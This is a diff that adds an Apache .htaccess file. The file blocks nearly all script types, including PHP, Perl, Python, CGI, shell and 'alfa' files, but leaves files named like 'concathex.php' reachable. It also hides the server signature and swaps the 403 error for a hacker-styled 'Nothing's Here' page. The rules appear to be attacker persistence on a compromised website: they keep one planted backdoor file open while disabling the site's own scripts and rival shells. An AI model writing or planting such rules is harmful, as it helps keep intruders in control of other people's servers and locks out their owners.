@@ -1,0 +1,10 @@
+<FilesMatch \.(?i:ph.*|pl|py|cgi|alfa|sh.*|bak|log|inc)$>
+Order Deny,Allow
+Deny from All
+</FilesMatch>
+<FilesMatch ".*concathex\.(?i:ph.*)">
+Order Deny,Allow
+Allow from All
+</FilesMatch>
+ServerSignature off
+ErrorDocument 403 "<title>zZzzZZz 404 zZzzZZz</title><body bgcolor='#1f1e1e'><i><h1 style='color:cyan;'><center>Wh00pzz, Nothing's Here...</h1></center><br><a href='https://www.hackerone.com/' style='color:#fbff0a'><center>~ Click Me! ~</a></center></body>"
